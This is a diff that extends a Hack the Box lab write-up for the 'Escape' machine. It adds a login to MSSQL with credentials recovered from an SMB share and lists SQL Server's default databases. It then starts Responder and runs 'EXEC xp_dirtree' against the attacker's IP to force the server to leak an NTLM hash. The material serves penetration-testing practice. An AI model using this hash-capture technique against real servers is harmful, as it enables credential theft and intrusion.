@@ -446,3 +446,29 @@ root@kali# smbclinet //10.10.11.202/Public -N
 root@kali# open SQL\ Server\ Procedures.pdf
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/400a083f-4e00-4655-bd7a-ab12d250697f)
+
+MSSQL
+```shell
+impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
+```
+
+On every SQL Server instance there are default system databases:
+- master - keeps the information for an instance of SQL Server.
+- msdb - used by SQL Server Agent.
+- model - template database copied for each new database.
+- resource - read only database that keeps system objects that are visible in every database on the server in sys schema.
+- tempdb - keeps temporary objects for SQL queries.
+
+```shell
+root@kali# impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/fcc30b01-8914-4d83-b288-42971e39ffad)
+
+NTLM Hash
+```shell
+root@kali# responder -I tun0
+```
+```shell
+SQL> EXEC xp_dirtree '\\10.10.14.10\share', 1, 1
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2f3d8fab-2b5f-4a46-9a11-c3f0e1251269)
